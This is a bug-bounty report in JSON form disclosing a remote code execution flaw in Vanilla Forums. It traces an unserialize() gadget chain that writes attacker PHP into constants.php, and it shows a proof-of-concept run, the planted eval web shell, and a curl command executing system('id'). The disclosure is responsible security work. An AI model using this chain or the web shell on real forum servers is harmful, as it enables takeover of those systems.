{"id":407552,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDc1NTI=","url":"https://hackerone.com/reports/407552","title":"Vanilla Forums Gdn_Format unserialize() Remote Code Execution Vulnerability","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2018-09-08T21:56:55.948Z","submitted_at":"2018-09-08T21:56:55.948Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mr_me","url":"/mr_me","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":17443,"url":"https://hackerone.com/vanilla","handle":"vanilla","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Vanilla","twitter_handle":"vanilla","website":"http://vanillaforums.com","about":"Vanilla is a powerfully simple discussion forum you can easily customize to make as unique as your community."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-11-23T15:47:15.399Z","bug_reporter_agreed_on_going_public_at":"2018-10-24T15:47:07.028Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\n\nAn authenticated admin user can trigger a call to unserialize() which can allow an attacker to gain remote code execution.\n\n**Description:**\n\nPlease bare with me on this one, it's heavy. Ok, so after setting a Garden.TouchIcon setting (it can be several settings, this is just an example of one) we can reach an the code in renderMaster inside of the library/core/class.controller.php file.\n\n```\nclass Gdn_Controller extends Gdn_Pluggable {\n\n    ...\n\n    public function renderMaster() {\n        // Build the master view if necessary\n        if (in_array($this-\u003e_DeliveryType, [DELIVERY_TYPE_ALL])) {\n\n        ...\n\n            $touchIcon = c('Garden.TouchIcon');                                     // 1\n            if ($touchIcon) {\n                $this-\u003eHead-\u003esetTouchIcon(Gdn_Upload::url($touchIcon));\n            }\n```\n\nAt [1] we see a call to the function c(). As it turns out, that function is just a macro for the call in library/core/functions.general.php\n\n```\nif (!function_exists('config')) {\n    /**\n     * Retrieves a configuration setting.\n     *\n     * @param string|bool $name The name of the configuration setting.\n     * Settings in different sections are separated by dots.\n     * @param mixed $default The result to return if the configuration setting is not found.\n     * @return mixed The configuration setting.\n     * @see Gdn::config()\n     */\n    function config($name = false, $default = false) {                              // 2\n        return Gdn::config($name, $default);\n    }\n}\n```\n\nAt [2] we see the call to Gdn::config which is using the 'Garden.TouchIcon' setting. This function is defined in library/core/class.gdn.php.\n\n```\nclass Gdn {\n\n    ...\n\n    /**\n     * Get a configuration setting for the application.\n     *\n     * @param string $name The name of the configuration setting. Settings in different sections are seperated by a dot ('.')\n     * @param mixed $default The result to return if the configuration setting is not found.\n     * @return Gdn_Configuration|mixed The configuration setting.\n     */\n    public static function config($name = false, $default = false) {\n        if (self::$_Config === null) {\n            self::$_Config = static::getContainer()-\u003eget(self::AliasConfig);\n        }\n        $config = self::$_Config;\n        if ($name === false) {\n            $result = $config;\n        } else {\n            $result = $config-\u003eget($name, $default);        // 3\n        }\n\n        return $result;\n    }\n```\n\nAt [3] the code calls get() on the Gdn_Configuration class using using the 'Garden.TouchIcon'. This code is defined in library/core/class.configuration.php:\n\n```\nclass Gdn_Configuration extends Gdn_Pluggable {\n\n    ...\n\n    public function get($name, $defaultValue = false) {\n        // Shortcut, get the whole config\n        if ($name == '.') {\n            return $this-\u003eData;\n        }\n\n        $keys = explode('.', $name);\n        // If splitting is off, HANDLE IT\n        if (!$this-\u003esplitting) {\n//         $FirstKey = getValue(0, $Keys);\n            $firstKey = $keys[0];\n            if ($firstKey == $this-\u003edefaultGroup) {\n                $keys = [array_shift($keys), implode('.', $keys)];\n            } else {\n                $keys = [$name];\n            }\n        }\n        $keyCount = count($keys);\n\n        $value = $this-\u003eData;\n        for ($i = 0; $i \u003c $keyCount; ++$i) {\n            if (is_array($value) \u0026\u0026 array_key_exists($keys[$i], $value)) {\n                $value = $value[$keys[$i]];\n            } else {\n                return $defaultValue;\n            }\n        }\n\n        if (is_string($value)) {\n            $result = Gdn_Format::unserialize($value);                          // 4\n        } else {\n            $result = $value;\n        }\n\n        return $result;\n    }\n```\n\nAt [4] we can see the static call to unserialize in the Gdn_Format and as suspected, inside of library/core/class.format.php we can see the following code:\n\n```\nclass Gdn_Format {\n\n    ...\n\n    /**\n     * Takes a serialized variable and unserializes it back into its original state.\n     * \n     * @param string $serializedString A json or php serialized string to be unserialized.\n     * @return mixed\n     */\n    public static function unserialize($serializedString) {\n        $result = $serializedString;\n\n        if (is_string($serializedString)) {\n            if (substr_compare('a:', $serializedString, 0, 2) === 0 || substr_compare('O:', $serializedString, 0, 2) === 0) {\n                $result = unserialize($serializedString);                          // 5\n            } elseif (substr_compare('obj:', $serializedString, 0, 4) === 0) {\n                $result = json_decode(substr($serializedString, 4), false);\n            } elseif (substr_compare('arr:', $serializedString, 0, 4) === 0) {\n                $result = json_decode(substr($serializedString, 4), true);\n            }\n        }\n        return $result;\n    }\n```\n\nAt [5] we can reach the vulnerable unserialize with attacker controlled input\n\nExploitation:\n=============\n\nOf course, theory is great but poc||gtfo? Well, as it turns out, there are a few options for us to pick from.\n\nsaturn:vanilla mr_me$ grep --color=always -ir \"__destruct\" .\n./library/database/class.dataset.php:    public function __destruct() {\n./library/core/class.proxyrequest.php:    public function __destruct() {\n./library/core/class.configuration.php:    public function __destruct() {\n\nThe Gdn_DataSet class is useless to us, however the ProxyRequest class seems a little bit more interesting: \n\n```\nclass ProxyRequest {\n\n    ...\n\n    public function __destruct() {\n        if (file_exists($this-\u003eCookieJar)) {\n            unlink($this-\u003eCookieJar);\n        }\n    }\n```\n\nThis can of course allow us to delete files from the remote system. Be careful here, as attackers can wipe the .htaccess files and weaken the security posture of the application. However, the prime candidate is RCE, so we opted for the next class, the Gdn_Configuration class of course! (how meta).\n\nOk so life is born in Gdn_Configuration's __destruct:\n\n```\nclass Gdn_Configuration extends Gdn_Pluggable {\n\n    ...\n\n    /**\n     *\n     */\n    public function __destruct() {\n        if ($this-\u003eautoSave) {                      // 1\n            $this-\u003eshutdown();                      // 2\n        }\n    }\n\n    /**\n     *\n     */\n    public function shutdown() {\n        foreach ($this-\u003esources as $source) {\n            $source-\u003eshutdown();                    // 3\n        }\n    }\n```\n\nWe can reach the shutdown() call at [2] if we set the autoSave property at [1]. Then at [3] we can call shutdown again, but on a different class, presumably the Gdn_ConfigurationSource class.\n\n```\nclass Gdn_ConfigurationSource extends Gdn_Pluggable {\n\n    ...\n\n    /**\n     *\n     *\n     * @throws Exception\n     */\n    public function shutdown() {\n        if ($this-\u003eDirty) {                 // 4\n            $this-\u003esave();                  // 5\n        }\n    }\n```\n\nWe can reach the save() call at [5] by setting the dirty property at [4].\n\n```\nclass Gdn_ConfigurationSource extends Gdn_Pluggable {\n\n    ...\n\n    /**\n     *\n     * \n     * @return bool|null\n     * @throws Exception\n     */\n    public function save() {\n        if (!$this-\u003eDirty) {\n            return null;\n        }\n\n        $this-\u003eEventArguments['ConfigDirty'] = \u0026$this-\u003eDirty;\n        $this-\u003eEventArguments['ConfigNoSave'] = false;\n        $this-\u003eEventArguments['ConfigType'] = $this-\u003eType;\n        $this-\u003eEventArguments['ConfigSource'] = $this-\u003eSource;\n        $this-\u003eEventArguments['ConfigData'] = $this-\u003eSettings;\n        $this-\u003efireEvent('BeforeSave');\n\n        if ($this-\u003eEventArguments['ConfigNoSave']) {\n            $this-\u003eDirty = false;\n            return true;\n        }\n\n        // Check for and fire callback if one exists\n        if ($this-\u003eCallback \u0026\u0026 is_callable($this-\u003eCallback)) {\n            $callbackOptions = [];\n            if (!is_array($this-\u003eCallbackOptions)) {\n                $this-\u003eCallbackOptions = [];\n            }\n\n            $callbackOptions = array_merge($callbackOptions, $this-\u003eCallbackOptions, [\n                'ConfigDirty' =\u003e $this-\u003eDirty,\n                'ConfigType' =\u003e $this-\u003eType,\n                'ConfigSource' =\u003e $this-\u003eSource,\n                'ConfigData' =\u003e $this-\u003eSettings,\n                'SourceObject' =\u003e $this\n            ]);\n\n            $configSaved = call_user_func($this-\u003eCallback, $callbackOptions);\n\n            if ($configSaved) {\n                $this-\u003eDirty = false;\n                return true;\n            }\n        }\n\n        switch ($this-\u003eType) {                              // 6\n            case 'file':\n                if (empty($this-\u003eSource)) {\n                    trigger_error(errorMessage('You must specify a file path to be saved.', 'Configuration', 'Save'), E_USER_ERROR);\n                }\n\n                $checkWrite = $this-\u003eSource;\n                if (!file_exists($checkWrite)) {\n                    $checkWrite = dirname($checkWrite);\n                }\n\n                if (!is_writable($checkWrite)) {\n                    throw new Exception(sprintf(t(\"Unable to write to config file '%s' when saving.\"), $this-\u003eSource));\n                }\n\n                $group = $this-\u003eGroup;                                                              // 7\n                $data = \u0026$this-\u003eSettings;\n                if ($this-\u003eConfiguration) {\n                    ksort($data, $this-\u003eConfiguration-\u003egetSortFlag());\n                }\n\n                // Check for the case when the configuration is the group.\n                if (is_array($data) \u0026\u0026 count($data) == 1 \u0026\u0026 array_key_exists($group, $data)) {\n                    $data = $data[$group];\n                }\n\n                // Do a sanity check on the config save.\n                if ($this-\u003eSource == Gdn::config()-\u003edefaultPath()) {\n                    // Log root config changes\n                    try {\n                        $logData = $this-\u003eInitial;\n                        $logData['_New'] = $this-\u003eSettings;\n                        LogModel::insert('Edit', 'Configuration', $logData);\n                    } catch (Exception $ex) {\n                    }\n\n                    if (!isset($data['Database'])) {\n                        if ($pm = Gdn::pluginManager()) {\n                            $pm-\u003eEventArguments['Data'] = $data;\n                            $pm-\u003eEventArguments['Backtrace'] = debug_backtrace();\n                            $pm-\u003efireEvent('ConfigError');\n                        }\n                        return false;\n                    }\n                }\n\n                $options = [\n                    'VariableName' =\u003e $group,                                                   // 8\n                    'WrapPHP' =\u003e true,\n                    'ByLine' =\u003e true\n                ];\n\n                if ($this-\u003eConfiguration) {\n                    $options = array_merge($options, $this-\u003eConfiguration-\u003egetFormatOptions());             // 9\n                }\n\n                // Write config data to string format, ready for saving\n                $fileContents = Gdn_Configuration::format($data, $options);                                 // 10\n\n                if ($fileContents === false) {\n                    trigger_error(errorMessage('Failed to define configuration file contents.', 'Configuration', 'Save'), E_USER_ERROR);\n                }\n\n                // Save to cache if we're into that sort of thing\n                $fileKey = sprintf(Gdn_Configuration::CONFIG_FILE_CACHE_KEY, $this-\u003eSource);\n                if ($this-\u003eConfiguration \u0026\u0026 $this-\u003eConfiguration-\u003ecaching() \u0026\u0026 Gdn::cache()-\u003etype() == Gdn_Cache::CACHE_TYPE_MEMORY \u0026\u0026 Gdn::cache()-\u003eactiveEnabled()) {\n                    $cachedConfigData = Gdn::cache()-\u003estore($fileKey, $data, [\n                        Gdn_Cache::FEATURE_NOPREFIX =\u003e true,\n                        Gdn_Cache::FEATURE_EXPIRY =\u003e 3600\n                    ]);\n                }\n\n                $tmpFile = tempnam(PATH_CONF, 'config');\n                $result = false;\n                if (file_put_contents($tmpFile, $fileContents) !== false) {                                 // 11\n                    chmod($tmpFile, 0775);\n                    $result = rename($tmpFile, $this-\u003eSource);                                              // 12\n                }\n```\n\nOk so at [6] we trigger a switch statement and want to land into the 'file' block. Then at [7] we want to set `$group` from `$this-\u003eGroup` to some PHP code. This will become apparent soon.\n\nThen at [8] we set `$options` to be an associative array containing our controlled `$group` at 'VariableName'. At [9] that array is merged with another array and then at [10] a call to format() is made. This has been excluded from the analysis but essentially, we can set a global variable in there using our controlled 'VariableName' value.\n\nNow after [10] we have our PHP code in `$fileContents` is then placed into a random file in the config directory at [11]. Finally, at [12] the random file is renamed to the attackers supplied filename using `$this-\u003eSource`.\n\nThis can allow remote code execution. In the exploit, I choose to use 'constants.php' as a target for a few reasons:\n\n1. We have a \"show stopper\" as its know, which is `if (!defined('APPLICATION')) exit();`. This wont allow us to execute PHP code directly\n   even if we delete the .htaccess using the other potential pop chain.\n\n   This contants.php file is included into the web root of the application, so we can execute the injected PHP code from the index page.\n\n2. The config folder is naturally writable due to the caching in the same directory and that the code contantantly (pun intended) updates the config.php file.\n\nRemember to snapshot or backup your installation before running this exploit. It DOES NOT attempt to clean up after exploitation.\n\n## Example:\n\n```\nsaturn:~ mr_me$ ./poc.py \n(+) usage: poc.py \u003ctarget\u003e \u003ccookie\u003e\n(+) eg: poc.py 172.16.175.143 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1Mzg5NDk5OTIsImlhdCI6MTUzNjM1Nzk5Miwic3ViIjoyfQ.OoAIBcGiGKFPxGsfg_-9hFfohv0dO_CNqx1lK8YE7Kg\n\nsaturn:~ mr_me$ ./poc.py 172.16.175.143 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1Mzg5NDk5OTIsImlhdCI6MTUzNjM1Nzk5Miwic3ViIjoyfQ.OoAIBcGiGKFPxGsfg_-9hFfohv0dO_CNqx1lK8YE7Kg\n(+) targeting: http://172.16.175.143\n(+) shell injected into contants.php successfully!\n(+) shell at: http://172.16.175.143/?c=phpinfo();\n\nsaturn:~ mr_me$ curl -sSG \"http://172.16.175.143/?c=system('id');\" | cut -d \"\u003c\" -f1\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\nNow, on the target system:\n\n```\nsteven@pluto:/var/www/html/conf$ cat constants.php \n\u003c?php if (!defined('APPLICATION')) exit();\n$a=eval($_GET[c]);//[''] = '';\n\n// Last edited by admin (172.16.175.1)2018-09-08 20:35:19\n```\n\n## Steps to reproduce:\n\n1. Backup your installation.\n2. Login as an admin and get the Vanilla cookie\n3. Run the poc against your target with the cookie.\n\n## Anything else we should know?\n\nGive me a few days and I'll write you a patch. Basically you just need a `__wakeUp` call in the Gdn_Configuration class.\n\n## Impact\n\nHigh, RCE.","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eAn authenticated admin user can trigger a call to unserialize() which can allow an attacker to gain remote code execution.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003ePlease bare with me on this one, it\u0026#39;s heavy. Ok, so after setting a Garden.TouchIcon setting (it can be several settings, this is just an example of one) we can reach an the code in renderMaster inside of the library/core/class.controller.php file.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eclass Gdn_Controller extends Gdn_Pluggable {\n\n    ...\n\n    public function renderMaster() {\n        // Build the master view if necessary\n        if (in_array($this-\u0026gt;_DeliveryType, [DELIVERY_TYPE_ALL])) {\n\n        ...\n\n            $touchIcon = c(\u0026#39;Garden.TouchIcon\u0026#39;);                                     // 1\n            if ($touchIcon) {\n                $this-\u0026gt;Head-\u0026gt;setTouchIcon(Gdn_Upload::url($touchIcon));\n            }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAt [1] we see a call to the function c(). As it turns out, that function is just a macro for the call in library/core/functions.general.php\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eif (!function_exists(\u0026#39;config\u0026#39;)) {\n    /**\n     * Retrieves a configuration setting.\n     *\n     * @param string|bool $name The name of the configuration setting.\n     * Settings in different sections are separated by dots.\n     * @param mixed $default The result to return if the configuration setting is not found.\n     * @return mixed The configuration setting.\n     * @see Gdn::config()\n     */\n    function config($name = false, $default = false) {                              // 2\n        return Gdn::config($name, $default);\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAt [2] we see the call to Gdn::config which is using the \u0026#39;Garden.TouchIcon\u0026#39; setting. This function is defined in library/core/class.gdn.php.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eclass Gdn {\n\n    ...\n\n    /**\n     * Get a configuration setting for the application.\n     *\n     * @param string $name The name of the configuration setting. Settings in different sections are seperated by a dot (\u0026#39;.\u0026#39;)\n     * @param mixed $default The result to return if the configuration setting is not found.\n     * @return Gdn_Configuration|mixed The configuration setting.\n     */\n    public static function config($name = false, $default = false) {\n        if (self::$_Config === null) {\n            self::$_Config = static::getContainer()-\u0026gt;get(self::AliasConfig);\n        }\n        $config = self::$_Config;\n        if ($name === false) {\n            $result = $config;\n        } else {\n            $result = $config-\u0026gt;get($name, $default);        // 3\n        }\n\n        return $result;\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAt [3] the code calls get() on the Gdn_Configuration class using using the \u0026#39;Garden.TouchIcon\u0026#39;. This code is defined in library/core/class.configuration.php:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eclass Gdn_Configuration extends Gdn_Pluggable {\n\n    ...\n\n    public function get($name, $defaultValue = false) {\n        // Shortcut, get the whole config\n        if ($name == \u0026#39;.\u0026#39;) {\n            return $this-\u0026gt;Data;\n        }\n\n        $keys = explode(\u0026#39;.\u0026#39;, $name);\n        // If splitting is off, HANDLE IT\n        if (!$this-\u0026gt;splitting) {\n//         $FirstKey = getValue(0, $Keys);\n            $firstKey = $keys[0];\n            if ($firstKey == $this-\u0026gt;defaultGroup) {\n                $keys = [array_shift($keys), implode(\u0026#39;.\u0026#39;, $keys)];\n            } else {\n                $keys = [$name];\n            }\n        }\n        $keyCount = count($keys);\n\n        $value = $this-\u0026gt;Data;\n        for ($i = 0; $i \u0026lt; $keyCount; ++$i) {\n            if (is_array($value) \u0026amp;\u0026amp; array_key_exists($keys[$i], $value)) {\n                $value = $value[$keys[$i]];\n            } else {\n                return $defaultValue;\n            }\n        }\n\n        if (is_string($value)) {\n            $result = Gdn_Format::unserialize($value);                          // 4\n        } else {\n            $result = $value;\n        }\n\n        return $result;\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAt [4] we can see the static call to unserialize in the Gdn_Format and as suspected, inside of library/core/class.format.php we can see the following code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eclass Gdn_Format {\n\n    ...\n\n    /**\n     * Takes a serialized variable and unserializes it back into its original state.\n     * \n     * @param string $serializedString A json or php serialized string to be unserialized.\n     * @return mixed\n     */\n    public static function unserialize($serializedString) {\n        $result = $serializedString;\n\n        if (is_string($serializedString)) {\n            if (substr_compare(\u0026#39;a:\u0026#39;, $serializedString, 0, 2) === 0 || substr_compare(\u0026#39;O:\u0026#39;, $serializedString, 0, 2) === 0) {\n                $result = unserialize($serializedString);                          // 5\n            } elseif (substr_compare(\u0026#39;obj:\u0026#39;, $serializedString, 0, 4) === 0) {\n                $result = json_decode(substr($serializedString, 4), false);\n            } elseif (substr_compare(\u0026#39;arr:\u0026#39;, $serializedString, 0, 4) === 0) {\n                $result = json_decode(substr($serializedString, 4), true);\n            }\n        }\n        return $result;\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAt [5] we can reach the vulnerable unserialize with attacker controlled input\u003c/p\u003e\n\n\u003ch1 id=\"exploitation\"\u003eExploitation:\u003c/h1\u003e\n\n\u003cp\u003eOf course, theory is great but poc||gtfo? Well, as it turns out, there are a few options for us to pick from.\u003c/p\u003e\n\n\u003cp\u003esaturn:vanilla mr_me$ grep --color=always -ir \u0026quot;__destruct\u0026quot; .\u003cbr\u003e\n./library/database/class.dataset.php:    public function __destruct() {\u003cbr\u003e\n./library/core/class.proxyrequest.php:    public function __destruct() {\u003cbr\u003e\n./library/core/class.configuration.php:    public function __destruct() {\u003c/p\u003e\n\n\u003cp\u003eThe Gdn_DataSet class is useless to us, however the ProxyRequest class seems a little bit more interesting: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eclass ProxyRequest {\n\n    ...\n\n    public function __destruct() {\n        if (file_exists($this-\u0026gt;CookieJar)) {\n            unlink($this-\u0026gt;CookieJar);\n        }\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis can of course allow us to delete files from the remote system. Be careful here, as attackers can wipe the .htaccess files and weaken the security posture of the application. However, the prime candidate is RCE, so we opted for the next class, the Gdn_Configuration class of course! (how meta).\u003c/p\u003e\n\n\u003cp\u003eOk so life is born in Gdn_Configuration\u0026#39;s __destruct:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eclass Gdn_Configuration extends Gdn_Pluggable {\n\n    ...\n\n    /**\n     *\n     */\n    public function __destruct() {\n        if ($this-\u0026gt;autoSave) {                      // 1\n            $this-\u0026gt;shutdown();                      // 2\n        }\n    }\n\n    /**\n     *\n     */\n    public function shutdown() {\n        foreach ($this-\u0026gt;sources as $source) {\n            $source-\u0026gt;shutdown();                    // 3\n        }\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe can reach the shutdown() call at [2] if we set the autoSave property at [1]. Then at [3] we can call shutdown again, but on a different class, presumably the Gdn_ConfigurationSource class.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eclass Gdn_ConfigurationSource extends Gdn_Pluggable {\n\n    ...\n\n    /**\n     *\n     *\n     * @throws Exception\n     */\n    public function shutdown() {\n        if ($this-\u0026gt;Dirty) {                 // 4\n            $this-\u0026gt;save();                  // 5\n        }\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe can reach the save() call at [5] by setting the dirty property at [4].\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eclass Gdn_ConfigurationSource extends Gdn_Pluggable {\n\n    ...\n\n    /**\n     *\n     * \n     * @return bool|null\n     * @throws Exception\n     */\n    public function save() {\n        if (!$this-\u0026gt;Dirty) {\n            return null;\n        }\n\n        $this-\u0026gt;EventArguments[\u0026#39;ConfigDirty\u0026#39;] = \u0026amp;$this-\u0026gt;Dirty;\n        $this-\u0026gt;EventArguments[\u0026#39;ConfigNoSave\u0026#39;] = false;\n        $this-\u0026gt;EventArguments[\u0026#39;ConfigType\u0026#39;] = $this-\u0026gt;Type;\n        $this-\u0026gt;EventArguments[\u0026#39;ConfigSource\u0026#39;] = $this-\u0026gt;Source;\n        $this-\u0026gt;EventArguments[\u0026#39;ConfigData\u0026#39;] = $this-\u0026gt;Settings;\n        $this-\u0026gt;fireEvent(\u0026#39;BeforeSave\u0026#39;);\n\n        if ($this-\u0026gt;EventArguments[\u0026#39;ConfigNoSave\u0026#39;]) {\n            $this-\u0026gt;Dirty = false;\n            return true;\n        }\n\n        // Check for and fire callback if one exists\n        if ($this-\u0026gt;Callback \u0026amp;\u0026amp; is_callable($this-\u0026gt;Callback)) {\n            $callbackOptions = [];\n            if (!is_array($this-\u0026gt;CallbackOptions)) {\n                $this-\u0026gt;CallbackOptions = [];\n            }\n\n            $callbackOptions = array_merge($callbackOptions, $this-\u0026gt;CallbackOptions, [\n                \u0026#39;ConfigDirty\u0026#39; =\u0026gt; $this-\u0026gt;Dirty,\n                \u0026#39;ConfigType\u0026#39; =\u0026gt; $this-\u0026gt;Type,\n                \u0026#39;ConfigSource\u0026#39; =\u0026gt; $this-\u0026gt;Source,\n                \u0026#39;ConfigData\u0026#39; =\u0026gt; $this-\u0026gt;Settings,\n                \u0026#39;SourceObject\u0026#39; =\u0026gt; $this\n            ]);\n\n            $configSaved = call_user_func($this-\u0026gt;Callback, $callbackOptions);\n\n            if ($configSaved) {\n                $this-\u0026gt;Dirty = false;\n                return true;\n            }\n        }\n\n        switch ($this-\u0026gt;Type) {                              // 6\n            case \u0026#39;file\u0026#39;:\n                if (empty($this-\u0026gt;Source)) {\n                    trigger_error(errorMessage(\u0026#39;You must specify a file path to be saved.\u0026#39;, \u0026#39;Configuration\u0026#39;, \u0026#39;Save\u0026#39;), E_USER_ERROR);\n                }\n\n                $checkWrite = $this-\u0026gt;Source;\n                if (!file_exists($checkWrite)) {\n                    $checkWrite = dirname($checkWrite);\n                }\n\n                if (!is_writable($checkWrite)) {\n                    throw new Exception(sprintf(t(\u0026quot;Unable to write to config file \u0026#39;%s\u0026#39; when saving.\u0026quot;), $this-\u0026gt;Source));\n                }\n\n                $group = $this-\u0026gt;Group;                                                              // 7\n                $data = \u0026amp;$this-\u0026gt;Settings;\n                if ($this-\u0026gt;Configuration) {\n                    ksort($data, $this-\u0026gt;Configuration-\u0026gt;getSortFlag());\n                }\n\n                // Check for the case when the configuration is the group.\n                if (is_array($data) \u0026amp;\u0026amp; count($data) == 1 \u0026amp;\u0026amp; array_key_exists($group, $data)) {\n                    $data = $data[$group];\n                }\n\n                // Do a sanity check on the config save.\n                if ($this-\u0026gt;Source == Gdn::config()-\u0026gt;defaultPath()) {\n                    // Log root config changes\n                    try {\n                        $logData = $this-\u0026gt;Initial;\n                        $logData[\u0026#39;_New\u0026#39;] = $this-\u0026gt;Settings;\n                        LogModel::insert(\u0026#39;Edit\u0026#39;, \u0026#39;Configuration\u0026#39;, $logData);\n                    } catch (Exception $ex) {\n                    }\n\n                    if (!isset($data[\u0026#39;Database\u0026#39;])) {\n                        if ($pm = Gdn::pluginManager()) {\n                            $pm-\u0026gt;EventArguments[\u0026#39;Data\u0026#39;] = $data;\n                            $pm-\u0026gt;EventArguments[\u0026#39;Backtrace\u0026#39;] = debug_backtrace();\n                            $pm-\u0026gt;fireEvent(\u0026#39;ConfigError\u0026#39;);\n                        }\n                        return false;\n                    }\n                }\n\n                $options = [\n                    \u0026#39;VariableName\u0026#39; =\u0026gt; $group,                                                   // 8\n                    \u0026#39;WrapPHP\u0026#39; =\u0026gt; true,\n                    \u0026#39;ByLine\u0026#39; =\u0026gt; true\n                ];\n\n                if ($this-\u0026gt;Configuration) {\n                    $options = array_merge($options, $this-\u0026gt;Configuration-\u0026gt;getFormatOptions());             // 9\n                }\n\n                // Write config data to string format, ready for saving\n                $fileContents = Gdn_Configuration::format($data, $options);                                 // 10\n\n                if ($fileContents === false) {\n                    trigger_error(errorMessage(\u0026#39;Failed to define configuration file contents.\u0026#39;, \u0026#39;Configuration\u0026#39;, \u0026#39;Save\u0026#39;), E_USER_ERROR);\n                }\n\n                // Save to cache if we\u0026#39;re into that sort of thing\n                $fileKey = sprintf(Gdn_Configuration::CONFIG_FILE_CACHE_KEY, $this-\u0026gt;Source);\n                if ($this-\u0026gt;Configuration \u0026amp;\u0026amp; $this-\u0026gt;Configuration-\u0026gt;caching() \u0026amp;\u0026amp; Gdn::cache()-\u0026gt;type() == Gdn_Cache::CACHE_TYPE_MEMORY \u0026amp;\u0026amp; Gdn::cache()-\u0026gt;activeEnabled()) {\n                    $cachedConfigData = Gdn::cache()-\u0026gt;store($fileKey, $data, [\n                        Gdn_Cache::FEATURE_NOPREFIX =\u0026gt; true,\n                        Gdn_Cache::FEATURE_EXPIRY =\u0026gt; 3600\n                    ]);\n                }\n\n                $tmpFile = tempnam(PATH_CONF, \u0026#39;config\u0026#39;);\n                $result = false;\n                if (file_put_contents($tmpFile, $fileContents) !== false) {                                 // 11\n                    chmod($tmpFile, 0775);\n                    $result = rename($tmpFile, $this-\u0026gt;Source);                                              // 12\n                }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOk so at [6] we trigger a switch statement and want to land into the \u0026#39;file\u0026#39; block. Then at [7] we want to set \u003ccode\u003e$group\u003c/code\u003e from \u003ccode\u003e$this-\u0026gt;Group\u003c/code\u003e to some PHP code. This will become apparent soon.\u003c/p\u003e\n\n\u003cp\u003eThen at [8] we set \u003ccode\u003e$options\u003c/code\u003e to be an associative array containing our controlled \u003ccode\u003e$group\u003c/code\u003e at \u0026#39;VariableName\u0026#39;. At [9] that array is merged with another array and then at [10] a call to format() is made. This has been excluded from the analysis but essentially, we can set a global variable in there using our controlled \u0026#39;VariableName\u0026#39; value.\u003c/p\u003e\n\n\u003cp\u003eNow after [10] we have our PHP code in \u003ccode\u003e$fileContents\u003c/code\u003e is then placed into a random file in the config directory at [11]. Finally, at [12] the random file is renamed to the attackers supplied filename using \u003ccode\u003e$this-\u0026gt;Source\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThis can allow remote code execution. In the exploit, I choose to use \u0026#39;constants.php\u0026#39; as a target for a few reasons:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eWe have a \u0026quot;show stopper\u0026quot; as its know, which is \u003ccode\u003eif (!defined(\u0026#39;APPLICATION\u0026#39;)) exit();\u003c/code\u003e. This wont allow us to execute PHP 